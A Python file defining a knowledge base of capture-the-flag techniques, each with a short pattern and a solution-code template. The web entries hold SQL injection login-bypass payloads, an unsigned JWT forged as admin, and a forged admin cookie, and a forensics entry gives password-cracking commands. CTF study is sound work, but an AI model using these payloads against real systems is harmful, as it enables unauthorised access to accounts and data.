from typing import List, Dict, Any

INITIAL_KNOWLEDGE_BASE: List[Dict[str, Any]] = [
    # =========================================================================
    # 1. CRYPTOGRAPHY
    # =========================================================================
    {
        "id": "crypto-001",
        "domain": "Cryptography",
        "title": "Time-based PRNG Seeding (Mersenne Twister)",
        "keywords": ["random", "seed", "time", "prng", "xor", "timestamp", "predict", "hackquest"],
        "pattern": "If random is seeded with int(time.time()), loop through timestamp ranges (-3600 to +3600 seconds from file creation or server response) to reproduce the exact random sequence and brute-force the XOR key.",
        "solution_template": "import random, time\napprox = 1700000000\nfor t in range(approx - 3600, approx + 3600):\n    random.seed(t)\n    key = bytes([random.randint(0, 255) for _ in range(len(ciphertext))])\n    dec = bytes([c ^ k for c, k in zip(ciphertext, key)])\n    if b'flag{' in dec.lower() or b'hqx{' in dec.lower() or b'ctf{' in dec.lower():\n        print(f'[+] Seed: {t} | Flag: {dec}')\n        break"
    },
    {
        "id": "crypto-002",
        "domain": "Cryptography",
        "title": "Single-Byte & Multi-Byte XOR Brute Force",
        "keywords": ["xor", "hex", "ciphertext", "single-byte", "frequency", "chi-squared", "cyberchef"],
        "pattern": "Ciphertext encrypted with a single byte or repeating key. Iterate 0 to 255, XOR every byte, and score the output using English letter frequency or search for flag header (flag{, HQX{, CTF{).",
        "solution_template": "raw = bytes.fromhex(hex_cipher)\nfor key in range(256):\n    dec = bytes([b ^ key for b in raw])\n    if any(h in dec.lower() for h in [b'flag{', b'hqx{', b'ctf{']):\n        print(f'[+] Key 0x{key:02x}: {dec}')"
    },
    {
        "id": "crypto-003",
        "domain": "Cryptography",
        "title": "RSA Small Public Exponent e=3 (Cube Root Attack)",
        "keywords": ["rsa", "e=3", "cube root", "low exponent", "modulus", "gmpy2", "coppersmith"],
        "pattern": "When e=3 and message m is short such that m^3 < n, no modulo reduction occurs. Compute the integer cube root of ciphertext c directly to recover plaintext m without factoring n.",
        "solution_template": "import gmpy2\nc = int(ciphertext_int)\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    hex_m = hex(m)[2:].rstrip('L')\n    if len(hex_m) % 2 != 0: hex_m = '0' + hex_m\n    print('Plaintext:', bytes.fromhex(hex_m).decode('latin-1'))"
    },
    {
        "id": "crypto-004",
        "domain": "Cryptography",
        "title": "RSA Common Modulus Attack (Same n, different e1, e2)",
        "keywords": ["rsa", "common modulus", "gcd", "bezout", "extended euclidean"],
        "pattern": "When the same message m is encrypted with two coprime public exponents e1 and e2 under the same modulus n. Compute Bezout coefficients a, b such that a*e1 + b*e2 = 1, then m = (c1^a * c2^b) mod n.",
        "solution_template": "from Crypto.Util.number import inverse\ndef common_modulus(c1, c2, e1, e2, n):\n    import math\n    def egcd(a, b):\n        if a == 0: return (b, 0, 1)\n        g, y, x = egcd(b % a, a)\n        return (g, x - (b // a) * y, y)\n    _, a, b = egcd(e1, e2)\n    if a < 0: c1 = inverse(c1, n); a = -a\n    if b < 0: c2 = inverse(c2, n); b = -b\n    return (pow(c1, a, n) * pow(c2, b, n)) % n"
    },

    # =========================================================================
    # 2. REVERSE ENGINEERING & BINARY ANALYSIS
    # =========================================================================
    {
        "id": "reversing-001",
        "domain": "Binary Exploitation",
        "title": "Python Bytecode Decompilation (.pyc / PyInstaller)",
        "keywords": ["pyc", "pyinstxtractor", "uncompyle6", "decompyle++", "decompilation", "reverse python"],
        "pattern": "Compiled Python executables or .pyc files. Run pyinstxtractor.py to unpack PyInstaller archive, fix the 16-byte .pyc header magic bytes, and decompile using uncompyle6 or decompyle++.",
        "solution_template": "# Step 1: Extract PyInstaller executable\n# python pyinstxtractor.py challenge.exe\n# Step 2: Fix magic bytes on challenge.pyc (header from struct.pyc)\n# Step 3: Decompile\n# uncompyle6 challenge.pyc > decompiled.py"
    },
    {
        "id": "reversing-002",
        "domain": "Binary Exploitation",
        "title": "String Carving & Dynamic strcmp Hooking (ltrace)",
        "keywords": ["ltrace", "strcmp", "strings", "symbols", "rodata", "radare2", "gdb"],
        "pattern": "ELF or PE binaries comparing user input to hardcoded or dynamically constructed password. Run strings -a -t x binary or execute under ltrace ./binary to intercept the plaintext argument passed to strcmp().",
        "solution_template": "# Dynamic execution hook with ltrace to reveal strcmp plaintext argument:\n# ltrace -s 100 ./challenge <<< 'AAAA_TEST_INPUT'\n# Look for strcmp('AAAA_TEST_INPUT', 'HQX{r3v3rs3_p4ssw0rd}')"
    },
    {
        "id": "reversing-003",
        "domain": "Binary Exploitation",
        "title": "UPX Packed Binary Unpacking",
        "keywords": ["upx", "packed", "compression", "unpack", "packer", "sections"],
        "pattern": "Binaries compressed with UPX (UPX0, UPX1 section headers). Decompress using upx -d binary to reveal full imports, strings, and disassemble cleanly in Ghidra / IDA.",
        "solution_template": "# Unpack UPX binary:\n# upx -d -o unpacked_binary challenge.bin\n# Verify strings on unpacked binary:\n# strings unpacked_binary | grep -E 'HQX|flag|CTF'"
    },

    # =========================================================================
    # 3. WEB APPLICATION SECURITY
    # =========================================================================
    {
        "id": "web-001",
        "domain": "Web",
        "title": "SQL Injection Authentication Bypass & UNION Extraction",
        "keywords": ["sqli", "sql injection", "union select", "bypass", "authentication", "sqlite", "mysql"],
        "pattern": "Vulnerable login or search forms concatenating raw SQL strings. Use ' OR '1'='1' -- to bypass logins, or determine column count with ' UNION SELECT 1,2,3 -- to exfiltrate tables and flags.",
        "solution_template": "import requests\nurl = 'http://target-ctf.com/login'\npayloads = [\"admin' --\", \"' OR 1=1 --\", \"' UNION SELECT 1, sql, 3 FROM sqlite_master --\"]\nfor p in payloads:\n    r = requests.post(url, data={'username': p, 'password': 'p'})\n    if 'flag{' in r.text.lower() or 'hqx{' in r.text.lower():\n        print('[+] Exploit successful with payload:', p)\n        break"
    },
    {
        "id": "web-002",
        "domain": "Web",
        "title": "JWT Token 'None' Algorithm & Key Confusion Bypass",
        "keywords": ["jwt", "token", "none algorithm", "hs256", "rs256", "authorization", "bearer"],
        "pattern": "JWT authentication vulnerable to algorithm manipulation. Strip signature and set 'alg': 'none', or sign using the server's public key as HMAC-SHA256 secret.",
        "solution_template": "import json, base64\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')\npayload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=')\nforged_jwt = f'{header.decode()}.{payload.decode()}.'\nprint('[+] Forged JWT Token:', forged_jwt)"
    },
    {
        "id": "web-003",
        "domain": "Web",
        "title": "Client-Side Timer, Cookie & LocalStorage Bypass",
        "keywords": ["timer", "localstorage", "cookie", "client-side", "javascript", "developer tools"],
        "pattern": "Challenges requiring waiting for a countdown timer or solving client-side puzzles. Inspect DevTools Console, inspect LocalStorage keys, or send HTTP request directly with completed status cookie.",
        "solution_template": "import requests\n# Directly query API without client timer delay:\nheaders = {'Cookie': 'timer_completed=true; role=admin'}\nr = requests.get('http://target-ctf.com/api/get_flag', headers=headers)\nprint(r.text)"
    },

    # =========================================================================
    # 4. FORENSICS & LOG / ARCHIVE ANALYSIS
    # =========================================================================
    {
        "id": "forensics-001",
        "domain": "Forensics",
        "title": "Unicode Zero-Width Steganography",
        "keywords": ["invisible", "zero-width", "whitespace", "stego", "unicode", "hidden", "spaces", "hackquest"],
        "pattern": "Look for invisible unicode characters: U+200B (Zero-Width Space = 0), U+200C (Zero-Width Non-Joiner = 1), U+200D (Joiner), and U+FEFF. Extract them, map each to binary digits, group into 8-bit bytes, and decode to ASCII.",
        "solution_template": "text = open('challenge.txt', 'r', encoding='utf-8').read()\nbits = ''.join(['0' if c == '\\u200b' else '1' for c in text if c in ['\\u200b', '\\u200c']])\nbytes_data = bytes([int(bits[i:i+8], 2) for i in range(0, len(bits), 8) if len(bits[i:i+8]) == 8])\nprint('Extracted Flag:', bytes_data)"
    },
    {
        "id": "forensics-002",
        "domain": "Forensics",
        "title": "File Carving & Magic Bytes Signature Repair",
        "keywords": ["png", "jpeg", "header", "magic bytes", "corrupt", "binwalk", "carving"],
        "pattern": "Files with corrupted headers or embedded payloads. Verify magic bytes (PNG: 89 50 4E 47 0D 0A 1A 0A; JPEG: FF D8 FF; ZIP: 50 4B 03 04). Use hex editing to repair damaged file headers.",
        "solution_template": "with open('corrupt.png', 'r+b') as f:\n    f.seek(0)\n    f.write(bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]))"
    },
    {
        "id": "forensics-003",
        "domain": "Forensics",
        "title": "LSB Image Steganography",
        "keywords": ["lsb", "least significant bit", "image", "stegsolve", "zsteg", "pixels"],
        "pattern": "Hidden data embedded in the least significant bit of RGB pixel values. Extract the 0th bit of red, green, and blue channels sequentially to reconstruct the hidden byte stream.",
        "solution_template": "from PIL import Image\nimg = Image.open('stego.png')\npixels = list(img.getdata())\nbits = [str(channel & 1) for p in pixels for channel in p[:3]]\nflag_bytes = bytes([int(''.join(bits[i:i+8]), 2) for i in range(0, 1000, 8)])"
    },
    {
        "id": "forensics-004",
        "domain": "Forensics",
        "title": "PCAP Wireshark Packet Extraction (HTTP / DNS)",
        "keywords": ["pcap", "wireshark", "tshark", "packet", "traffic", "dns", "exfiltration"],
        "pattern": "Network packet capture with exfiltrated files or credentials. Use tshark or scapy to filter HTTP POST requests, export HTTP objects, or reassemble base64/hex subdomains from DNS queries.",
        "solution_template": "# Extract HTTP files with tshark:\n# tshark -r capture.pcap --export-objects http,./extracted_files/\n# Extract DNS exfiltration queries:\n# tshark -r capture.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | cut -d. -f1 | xxd -r -p"
    },
    {
        "id": "forensics-005",
        "domain": "Forensics",
        "title": "Encrypted ZIP / PDF Password Cracking (John the Ripper)",
        "keywords": ["zip2john", "pdf2john", "john", "hashcat", "password", "crack", "rockyou"],
        "pattern": "Password-protected archives or PDFs. Extract password hashes using zip2john or pdf2john, then crack with John the Ripper or Hashcat using rockyou.txt wordlist.",
        "solution_template": "# Step 1: Extract hash\n# zip2john secret.zip > secret.hash\n# Step 2: Crack hash with rockyou wordlist\n# john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash\n# Step 3: Show cracked password\n# john --show secret.hash"
    }
]
